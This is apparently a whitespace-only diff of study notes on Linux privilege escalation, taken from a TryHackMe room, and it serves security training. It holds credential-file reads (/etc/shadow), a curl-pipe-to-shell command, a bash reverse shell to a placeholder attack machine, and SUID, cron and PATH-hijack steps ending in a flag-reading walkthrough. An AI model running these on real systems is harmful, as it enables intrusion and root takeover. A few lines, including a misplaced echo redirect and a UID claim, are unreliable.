@@ -2,85 +2,85 @@
 
 System
 ------
-> ls /etc/*-release
+> ls /etc/*-release  
 locate all files with release (i.e. OS version info) - then `cat` the files found
 
-> hostname
+> hostname  
 output is system name
 
-`cat` the following files for infor on users and groups including password hashes:
-> cat /etc/passwd
-> sudo cat /etc/shadow (only available for root user or if you can run as sudo on it)
+`cat` the following files for infor on users and groups including password hashes:  
+> cat /etc/passwd  
+> sudo cat /etc/shadow (only available for root user or if you can run as sudo on it)  
 > cat /etc/group
 
-> ls -lh /var/mail/
+> ls -lh /var/mail/  
 the discovered directories may contain info on users and sensitive files
 
-> ls -lh /usr/bin/
-and
-> ls -lh /usr/bin/
+> ls -lh /usr/bin/  
+and  
+> ls -lh /usr/bin/  
 finds installed applications
 
-> rpm -qa
+> rpm -qa  
 lists all installed packages on a RPM-based Linux system
 
-> dpkg -l
+> dpkg -l  
 lists all installed packages on a Debian-based Linux system
 
-> who
+> who  
 lists presently logged in users
 
-> w
+> w  
 lists presently logged in users AND what they are doing
 
-> id
+> id  
 print user and group IDs
 
-> last
+> last  
 print list of last users to log in
 
-> sudo -l
+> sudo -l  
 print users who have sudo privileges
 
 Networking
 ----------
-> ip address show
-or
-> ip a s
+> ip address show  
+or  
+> ip a s  
 [these commands replace: ifconfig -a]
 
-> cat /etc/resolv.conf
+> cat /etc/resolv.conf  
 find DNS server
 
-> netstat
-has the following flags to choose from:
--a = listening and non-listening sockets
--l = only listening sockets
--n = only numeric outout; do not resolve IP address and port
--t = show TCP connections
--u = show UDP connections
--x = UNIX
--p = show PID and program name associated with each port (aka socket) - note: only will return this info when run as `sudo`
-Note: these flags came be combined, e.g. sudo netstat -plt
+> netstat  
+has the following flags to choose from:  
+-a = listening and non-listening sockets  
+-l = only listening sockets  
+-n = only numeric outout; do not resolve IP address and port  
+-t = show TCP connections  
+-u = show UDP connections  
+-x = UNIX  
+-p = show PID and program name associated with each port (aka socket) - note: only will return this info when run as `sudo`  
+Note: these flags came be combined, e.g. sudo netstat -plt  
 Note: netstat may pick up things missed by the nmap scan done before initial access
 
-> lsof
-* lsof = list open files
-* Note: to get full list run as `sudo`
-* adding -i will pull only files connected to network connections
+> lsof  
+* lsof = list open files  
+* Note: to get full list run as `sudo`  
+* adding -i will pull only files connected to network connections  
 * if you are only interested in a specific port, the syntax is: lsof -i :<port_number>
 
 Running Services
 ----------------
-> ps
-has the following flags to choose from:
--e = all processes
--f = full-format
--j = jobs format
--l = long format
--u = user-oriented format
-Note: `ps axf` will print a process tree using ASCII
-Note: the BSD equivalent of the above commands is `ps aux`
+> ps  
+has the following flags to choose from:  
+-e = all processes  
+-f = full-format  
+-j = jobs format  
+-l = long format  
+-u = user-oriented format  
+Note: `ps axf` will print a process tree using ASCII  
+Note: the BSD equivalent of the above commands is `ps aux`  
 Note: `| grep <keyword>` can be added when looking for a specific process
 ---------------------------------------------------------------------------------------------------------------------
 [From: TryHackMe - Linux Privilege Escalation ; https://tryhackme.com/room/linprivesc ; Task 3 - Enumeration (with editing, changes, and additions)]
@@ -90,129 +90,129 @@ Enumeration is the first step you have to take once you gain access to any syste
 ------------------------------
 Helpful CLI Commands used to enumerate a Linux device in order to gain the information needed for privilege escalation
 ----------------------------------------------------------------------------------------------------------------------
-hostname
+hostname  
 The 'hostname' command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).
 
-uname -a
+uname -a  
 Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.
 
 OS/Distro and Kernel Info
 -------------------------
-cat /etc/os-release
-"will provide quite a detailed account of your Linux operating system's version"
-cat /etc/*release
-"Slightly more information can be gathered using the *release file instead. This displays all information from files ending with the word "release" in the /etc/ directory, concatenated into a single output."
-- the above are about the OS distro, for kernel information use:
-cat /proc/version
-"You'll find the version number of your current Linux kernel, compiled from information from the /proc/sys/kernel/ostype, /proc/sys/kernel/osrelease, and /proc/sys/kernel/version files. As noted earlier, the cat command concatenates information from various files, which is what is happening here."
+cat /etc/os-release  
+"will provide quite a detailed account of your Linux operating system's version"  
+cat /etc/*release  
+"Slightly more information can be gathered using the *release file instead. This displays all information from files ending with the word "release" in the /etc/ directory, concatenated into a single output."  
+- the above are about the OS distro, for kernel information use:  
+cat /proc/version  
+"You'll find the version number of your current Linux kernel, compiled from information from the /proc/sys/kernel/ostype, /proc/sys/kernel/osrelease, and /proc/sys/kernel/version files. As noted earlier, the cat command concatenates information from various files, which is what is happening here."  
 (from: https://www.makeuseof.com/ - 10 Ways to Check Which Linux Version You're Running - PUBLISHED AUG 28, 2019)
 
-ps Command
-The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
-The output of the ps (Process Status) will show the following;
-* PID: The process ID (unique to the process)
-* TTY: Terminal type used by the user
-* Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
-* CMD: The command or executable running (will NOT display any command line parameter)
-The “ps” command provides a few useful options.
-* ps -A: View all running processes
-* ps -axjf: View process tree
+ps Command  
+The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.  
+The output of the ps (Process Status) will show the following;  
+* PID: The process ID (unique to the process)  
+* TTY: Terminal type used by the user  
+* Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)  
+* CMD: The command or executable running (will NOT display any command line parameter)  
+The “ps” command provides a few useful options.  
+* ps -A: View all running processes  
+* ps -axjf: View process tree  
 * ps -aux: The aux option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.
 
-env
-The 'env' command will show environmental variables.
+env  
+The 'env' command will show environmental variables.  
 The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.
 
-sudo -l
+sudo -l  
 The target system may be configured to allow users to run some (or all) commands with root privileges. The sudo -l command can be used to list all commands your user can run using sudo.
 
-ls
-One of the most common commands used in Linux is probably 'ls'.
+ls  
+One of the most common commands used in Linux is probably 'ls'.  
 While looking for potential privilege escalation vectors, please remember to always use the ls command with the -la parameter (so hidden files will also be shown). 
 
-id
-The 'id' command will provide a general overview of the user’s privilege level and group memberships.
+id  
+The 'id' command will provide a general overview of the user’s privilege level and group memberships.  
 It is worth remembering that the id command can also be used to obtain the same information for another user (syntax: id <USERNAME>).
 
-history
+history  
 Looking at earlier commands with the 'history' command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.
 
-ifconfig and ip route
-The target system may be a pivoting point to another network. The 'ifconfig' command will give us information about the network interfaces of the system. However, some of the interfaces listed may not be directly accessible by the system you are presently on.
+ifconfig and ip route  
+The target system may be a pivoting point to another network. The 'ifconfig' command will give us information about the network interfaces of the system. However, some of the interfaces listed may not be directly accessible by the system you are presently on.  
 Use the 'ip route' command to see which network routes exist for the system you are on.
 
-netstat
-Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The 'netstat' command can be used with several different options to gather information on existing connections.
-* netstat -a: shows all listening ports and established connections.
-* netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.
-* netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
-* netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.
-* netstat -tp: list connections with the service name and PID information. This can also be used with the -l option (netstat -ltp) to list listening ports.
-However, if you are not running this command as aroot user the “PID/Program name” column will show "-" for any process owned by another user. If possible, run this command as root to see the names of all processes.
-* netstat -i: Shows interface statistics (i.e. how active each interface is).
-* netstat -ano: The netstat usage you will probably see most often in blog posts, write-ups, and courses is 'netstat -ano' which can be broken down as follows:
--a: Display all sockets
--n: Do not resolve names
+netstat  
+Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The 'netstat' command can be used with several different options to gather information on existing connections.  
+* netstat -a: shows all listening ports and established connections.  
+* netstat -at or netstat -au can also be used to list TCP or UDP protocols respectively.  
+* netstat -l: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)  
+* netstat -s: list network usage statistics by protocol (below) This can also be used with the -t or -u options to limit the output to a specific protocol.  
+* netstat -tp: list connections with the service name and PID information. This can also be used with the -l option (netstat -ltp) to list listening ports.  
+However, if you are not running this command as aroot user the “PID/Program name” column will show "-" for any process owned by another user. If possible, run this command as root to see the names of all processes.  
+* netstat -i: Shows interface statistics (i.e. how active each interface is).  
+* netstat -ano: The netstat usage you will probably see most often in blog posts, write-ups, and courses is 'netstat -ano' which can be broken down as follows:  
+-a: Display all sockets  
+-n: Do not resolve names  
 -o: Display timer
 
-find Command
-Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.
-Below are some useful examples for the “find” command.
-Find files:
-find . -name flag1.txt: find the file named “flag1.txt” in the current directory
-find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
-find / -type d -name config: find the directory named config under “/”
-find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
-find / -perm a=x: find executable files
-find /home -user frank: find all files for user “frank” under “/home”
-find / -mtime 10: find files that were modified in the last 10 days
-find / -atime 10: find files that were accessed in the last 10 day
-find / -cmin -60: find files changed within the last hour (60 minutes)
-find / -amin -60: find files accesses within the last hour (60 minutes)
+find Command  
+Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.  
+Below are some useful examples for the “find” command.  
+Find files:  
+find . -name flag1.txt: find the file named “flag1.txt” in the current directory  
+find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory  
+find / -type d -name config: find the directory named config under “/”  
+find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)  
+find / -perm a=x: find executable files  
+find /home -user frank: find all files for user “frank” under “/home”  
+find / -mtime 10: find files that were modified in the last 10 days  
+find / -atime 10: find files that were accessed in the last 10 day  
+find / -cmin -60: find files changed within the last hour (60 minutes)  
+find / -amin -60: find files accesses within the last hour (60 minutes)  
 find / -size 50M: find files with a 50 MB size. This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size (e.g. find / -size +100M or find / -size -10M)
 
 It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output.
 
-Here is how to find files that are able to be written to or executed from:
-* find / -writable -type d 2>/dev/null : Find world-writeable folders
-* find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
-* find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
-(The reason we see three different “find” commands that could potentially lead to the same result can be seen in the 'find' manual document. Basically, the '-perm' parameter affects the way “find” works.)
+Here is how to find files that are able to be written to or executed from:  
+* find / -writable -type d 2>/dev/null : Find world-writeable folders  
+* find / -perm -222 -type d 2>/dev/null: Find world-writeable folders  
+* find / -perm -o w -type d 2>/dev/null: Find world-writeable folders  
+(The reason we see three different “find” commands that could potentially lead to the same result can be seen in the 'find' manual document. Basically, the '-perm' parameter affects the way “find” works.)  
 * find / -perm -o x -type d 2>/dev/null : Find world-executable folders
 
-Find development tools and supported languages:
-* find / -name perl*
-* find / -name python*
+Find development tools and supported languages:  
+* find / -name perl*  
+* find / -name python*  
 * find / -name gcc*
 
-Find specific file permissions:
-Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path (see below).
+Find specific file permissions:  
+Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path (see below).  
 * find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
 
-General Linux Commands
+General Linux Commands  
 As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Get comfortable with commands such as find, locate, grep, cut, sort, etc.
 
 -----------------------------------------------------------------------
 Files to search for information that may assist in privilege escalation
 -----------------------------------------------------------------------
-/proc/version
-The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.
+/proc/version  
+The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.  
 Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.
 
-/etc/issue
+/etc/issue  
 Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.
 
-/etc/passwd
-Reading the /etc/passwd file can be an easy way to discover users on the system.
-While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks, using the following syntax:
-cat /etc/passwd | cut -d ":" -f 1
-Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory; syntax: cat /etc/passwd | grep home.
+/etc/passwd  
+Reading the /etc/passwd file can be an easy way to discover users on the system.  
+While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks, using the following syntax:  
+cat /etc/passwd | cut -d ":" -f 1  
+Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory; syntax: cat /etc/passwd | grep home.  
 [Note: Human users always have a UUID of greater than 1000 (the UUID is found in the third column of each entry). Any users whose UUID is not greater than 1000 are root/service/daemon users -- Jasper Alblas ; https://medium.com/@JAlblas/tryhackme-owasp-top-10-task-1-16-walkthrough-da5e96a4a803)
 
-Also see:
-* /etc/shadow
-* /etc/group
-* /etc/sudoers
+Also see:  
+* /etc/shadow  
+* /etc/group  
+* /etc/sudoers  
 [hat tip: Heath Adams - The Cyber Mentor]
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 [From: TryHackMe - Linux Privilege Escalation ; https://tryhackme.com/room/linprivesc ; Task 4 - Automated Enumeration Tools (with some editing)]
@@ -221,12 +221,12 @@ Several tools can help you save time during the enumeration process. These tools
 
 The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few tools rather than having a single "go-to" tool.
 
-LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
-[also see: https://www.aldeid.com/wiki/LinPEAS ; you can run up-to-date version directly from GitHub using:
-curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh]
-LinEnum: https://github.com/rebootuser/LinEnum
-LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
-Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
+LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS  
+[also see: https://www.aldeid.com/wiki/LinPEAS ; you can run up-to-date version directly from GitHub using:  
+curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh]  
+LinEnum: https://github.com/rebootuser/LinEnum  
+LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester  
+Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration  
 Linux Priv Checker: https://github.com/linted/linuxprivchecker
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 [From: TryHackMe - Linux Privilege Escalation ; https://tryhackme.com/room/linprivesc ; Task 5 - Privilege Escalation: Kernel Exploits (with some editing, etc.)]
@@ -237,22 +237,22 @@ Unless a single vulnerability leads to a root shell, the privilege escalation pr
 
 The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
 
-The Kernel exploit methodology is simple:
-1) Identify the kernel version
-2) Search and find an exploit code for the kernel version of the target system
+The Kernel exploit methodology is simple:  
+1) Identify the kernel version  
+2) Search and find an exploit code for the kernel version of the target system  
 3) Run the exploit
 
 WARNING: Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.
 
-Research sources:
-* Based on your findings, you can use Google to search for an existing exploit code.
-* Sources such as https://www.linuxkernelcves.com/cves can also be useful.
+Research sources:  
+* Based on your findings, you can use Google to search for an existing exploit code.  
+* Sources such as https://www.linuxkernelcves.com/cves can also be useful.  
 * Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).
 
-Hints/Notes:
-* Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit [can mean missing potential exploits].
-* WARNING: Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
-* Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
+Hints/Notes:  
+* Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit [can mean missing potential exploits].  
+* WARNING: Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.  
+* Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.  
 * You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively.
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 [From: https://tryhackme.com/room/linprivesc ; Task 7 - Privilege Escalation: SUID (with editing, etc.)]
@@ -267,17 +267,17 @@ find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SG
 A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).
 
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-[From: https://tryhackme.com/room/linprivesc ; Task 8 - Privilege Escalation: Capabilities (with editing, etc.)]
-Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
+[From: https://tryhackme.com/room/linprivesc ; Task 8 - Privilege Escalation: Capabilities (with editing, etc.)]  
+Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
 The capabilities 'man' page provides detailed information on its usage and options.
 
-We can use the 'getcap' tool to list enabled capabilities.
-example syntax: getcap -r / 2>/dev/null
-[Note: When run as an unprivileged user, 'getcap -r /' will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.]
+We can use the 'getcap' tool to list enabled capabilities.  
+example syntax: getcap -r / 2>/dev/null  
+[Note: When run as an unprivileged user, 'getcap -r /' will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.]  
 ...GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-[From: https://tryhackme.com/room/linprivesc ; Task 9 - Privilege Escalation: Cron Jobs (with editing, etc.)]
-Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
+[From: https://tryhackme.com/room/linprivesc ; Task 9 - Privilege Escalation: Cron Jobs (with editing, etc.)]  
+Cron jobs are used to run scripts or binaries at specific times. By default, they run with the privilege of their owners and not the current user. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.  
 The idea is quite simple; if there is a scheduled task that runs with root privileges and we can change the script that will be run, then our script will run with root privileges.
 
 Cron job configurations are stored as crontabs (cron tables); [these tables show] the next time and date the task will run.
@@ -290,184 +290,184 @@ While CTF machines can have cron jobs running every minute or every 5 minutes, y
 
 [If] our current user can access [a] script set to run [as a cron job], we can easily modify it to create a reverse shell, hopefully with root privileges.
 
-The script will use the tools available on the target system to launch a reverse shell.
-Two points to note:
-1) The command syntax will vary depending on the available tools. (e.g. nc will probably not support the -e option you may have seen used in other cases)
+The script will use the tools available on the target system to launch a reverse shell.  
+Two points to note:  
+1) The command syntax will vary depending on the available tools. (e.g. nc will probably not support the -e option you may have seen used in other cases)  
 2) We should always prefer to start reverse shells, as we not want to compromise the system integrity during a real penetration testing engagement.
 -----------
-An example reverse shell script:
-#!/bin/bash
+An example reverse shell script:  
+#!/bin/bash  
 bash -i >& /dev/tcp/<IP_ADDRESS_OF_ATTACK MACHINE>/<ATTACK_MACHINE'S_LISTENING_PORT> 0>&1
 
-On the attack machine we will open up a listening port to await the reverse shell:
+On the attack machine we will open up a listening port to await the reverse shell:  
 nc -nlvp <LISTENING_PORT>
 ------------
 Crontab is always worth checking as it can sometimes lead to easy privilege escalation vectors. The following scenario is not uncommon in companies that do not have a certain cyber security maturity level:
 
-* System administrators need to run a script at regular intervals.
-* They create a cron job to do this
-* After a while, the script becomes useless, and they delete it
-* They do not clean the relevant cron job
+* System administrators need to run a script at regular intervals.  
+* They create a cron job to do this  
+* After a while, the script becomes useless, and they delete it  
+* They do not clean the relevant cron job  
 * This change management issue leads to a potential exploit leveraging cron jobs.
 
 If a script was deleted, but the cron job still exists and if the full path of the script is not defined ... cron will refer to the paths listed under the PATH variable in the /etc/crontab file. In this case, we should be able to create a script with the same name as the deleted script under our user’s home folder and it should be run by the cron job.
 
 In the odd event you find an existing script or task attached to a cron job, it is always worth spending time to understand the function of the script and how any tool is used within the context. For example, tar, 7z, rsync, etc., can be exploited using their wildcard feature.
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
-[From: https://tryhackme.com/room/linprivesc ; Task 10 - Privilege Escalation: PATH (with editing, etc.)]
+[From: https://tryhackme.com/room/linprivesc ; Task 10 - Privilege Escalation: PATH (with editing, etc.)]  
 If a folder for which your user has write permission is located in the path, you could potentially hijack an application to run a script. PATH in Linux is an environmental variable that tells the operating system where to search for executables. For any command that is not built into the shell or that is not defined with an absolute path, Linux will start searching in folders defined under PATH. (PATH is the environmental variable were are talking about here, path is the location of a file).
 
-Typically the PATH will look like this:
-> echo $PATH
+Typically the PATH will look like this:  
+> echo $PATH  
 /usr/local/sbin:usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 
 If we type “thm” to the command line, these are the locations Linux will look in for an executable called thm. The scenario below will give you a better idea of how this can be leveraged to increase our privilege level. As you will see, this depends entirely on the existing configuration of the target system, so be sure you can answer the questions below before trying this.
 
-1) What folders are located under $PATH
-2) Does your current user have write privileges for any of these folders?
-3) Can you modify $PATH?
+1) What folders are located under $PATH  
+2) Does your current user have write privileges for any of these folders?  
+3) Can you modify $PATH?  
 4) Is there a script/application you can start that will be affected by this vulnerability?
 
 For demo purposes, we will use the script below:
 
-> cat path_exp.c
-#include<unistd.h>
-void main()
-{ setuid(0);
-  setgid(0);
-  system("thm");
+> cat path_exp.c  
+#include<unistd.h>  
+void main()  
+{ setuid(0);  
+  setgid(0);  
+  system("thm");  
  }
 
 This script tries to launch a system binary called “thm” but the example can easily be replicated with any binary.
 
-We compile this into an executable: 
+We compile this into an executable:  
 > gcc path_exp.c -o path -w
 
-and set the SUID bit.
+and set the SUID bit.  
 > chmod u+s path
 
-Our user now has access to the “path” script with SUID bit set.
-Once executed “path” will look for an executable named “thm” inside folders listed under PATH.
+Our user now has access to the “path” script with SUID bit set.  
+Once executed “path” will look for an executable named “thm” inside folders listed under PATH.  
 If any writable folder is listed under PATH we could create a binary named thm under that directory and have our “path” script run it. As the SUID bit is set, this binary will run with root privilege
 
-A simple search for writable folders can done using the 'find / -writable 2>/dev/null' command. The output of this command can be cleaned using a simple cut and sort sequence:
+A simple search for writable folders can done using the 'find / -writable 2>/dev/null' command. The output of this command can be cleaned using a simple cut and sort sequence:  
 find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
 
-Some CTF scenarios can present different folders but a regular system would output something like we see below:
-dev
-home
-proc
-run
-snap
-sys
-tmp
-usr
+Some CTF scenarios can present different folders but a regular system would output something like we see below:  
+dev  
+home  
+proc  
+run  
+snap  
+sys  
+tmp  
+usr  
 var
 
-Comparing this with PATH will help us find folders we could use.
-> echo $PATH
+Comparing this with PATH will help us find folders we could use.  
+> echo $PATH  
 /usr/local/sbin:usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
 
-We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders:
+We see a number of folders under /usr, thus it could be easier to run our writable folder search once more to cover subfolders:  
 find / -writable 2>/dev/null | grep usr | cut -d "/" -f 2,3 | sort -u
 
-An alternative could be the command below:
-find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+An alternative could be the command below:  
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u  
 We have added “grep -v proc” to get rid of the many results related to running processes.
 
 Unfortunately, subfolders under /usr are not writable
 
 The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the 'export PATH=/tmp:$PATH' command accomplishes this.
 
-At this point the path script will also look under the /tmp folder for an executable named “thm”.
-Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.
-> cd /tmp
-> echo "/bin/bash" > thm
-> chmod 777 thm
-> ls -l
+At this point the path script will also look under the /tmp folder for an executable named “thm”.  
+Creating this command is fairly easy by copying /bin/bash as “thm” under the /tmp folder.  
+> cd /tmp  
+> echo "/bin/bash" > thm  
+> chmod 777 thm  
+> ls -l  
 We have given executable rights to our copy of /bin/bash, please note that at this point it will run with our user’s right. What makes a privilege escalation possible within this context is that the path script runs with root privileges.
 
 -----
-In order to add more context to the use of the PATH vulnerability in order to escalate privileges it pays to review the steps taken to answer the challenge questions in this Task (see: https://medium.com/@cyberjunkiebynight/linux-privesc-tryhackme-write-up-a284b97d5f4):
-* The hacker starts off with access to the Karen account.
-* The goal is to read the flag6.txt file located in the /home/matt folder - a folder Karen does not have access to
-* The hacker searches for writable folders:
-> find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u
-and finds that the following folder is writable: /home/murdoch
-* A check of the /home/murdoch folder shows a python script with an undefined parameter (thm.py) and the compiled version of that script (test) with the SUID bit set (granting root privileges to this executable)
-> ls -l
--rwsr-xr-x 1 root root 16712 Jun 20  2021 test
--rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py
-> cat thm.py
+In order to add more context to the use of the PATH vulnerability in order to escalate privileges it pays to review the steps taken to answer the challenge questions in this Task (see: https://medium.com/@cyberjunkiebynight/linux-privesc-tryhackme-write-up-a284b97d5f4):  
+* The hacker starts off with access to the Karen account.  
+* The goal is to read the flag6.txt file located in the /home/matt folder - a folder Karen does not have access to  
+* The hacker searches for writable folders:  
+> find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u  
+and finds that the following folder is writable: /home/murdoch  
+* A check of the /home/murdoch folder shows a python script with an undefined parameter (thm.py) and the compiled version of that script (test) with the SUID bit set (granting root privileges to this executable)  
+> ls -l  
+-rwsr-xr-x 1 root root 16712 Jun 20  2021 test  
+-rw-rw-r-- 1 root root    86 Jun 20  2021 thm.py  
+> cat thm.py  
 /usr/bin/python3
 
-import os
+import os  
 import sys
 
-try: 
-	os.system("thm")
-except:
-	sys.exit()
-* The hacker adds /home/murdoch to the PATH of the user Karen:
-> export PATH=/home/murdoch:$PATH
-* A check on PATH shows that it is now there:
-> echo $PATH
-/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-* the hacker creates a file in /home/murdoch (which remember is writable) called thm with a script that will read the flag6.txt file if it can run with root privilege:
-> echo "cat /home/matt/flag6.txt > thm"
-* the hacker makes the file executable
-> chmod 777 thm
-* the hacker runs the executable called: test
-> ./test
-* the text of /home/matt/flag6.txt is printed on the terminal screen
+try:  
+	os.system("thm")  
+except:  
+	sys.exit()  
+* The hacker adds /home/murdoch to the PATH of the user Karen:  
+> export PATH=/home/murdoch:$PATH  
+* A check on PATH shows that it is now there:  
+> echo $PATH  
+/home/murdoch:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin  
+* the hacker creates a file in /home/murdoch (which remember is writable) called thm with a script that will read the flag6.txt file if it can run with root privilege:  
+> echo "cat /home/matt/flag6.txt > thm"  
+* the hacker makes the file executable  
+> chmod 777 thm  
+* the hacker runs the executable called: test  
+> ./test  
+* the text of /home/matt/flag6.txt is printed on the terminal screen  
 This happens because when the test executable runs it looks for the thm parameter that is in its script. It checks $PATH and since the /home/murdoch file is now listed there it looks in that folder for thm. It finds the thm file that the hacker created and runs the script it finds in that file. That script concatanetes the /home/matt/flag6.txt file. Now, that file is not normally readable by the user Karen; however, the test executable had the SUID set so it runs with root privileges and therefore can use the script in thm to concatenate the /home/matt/flag6.txt file
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
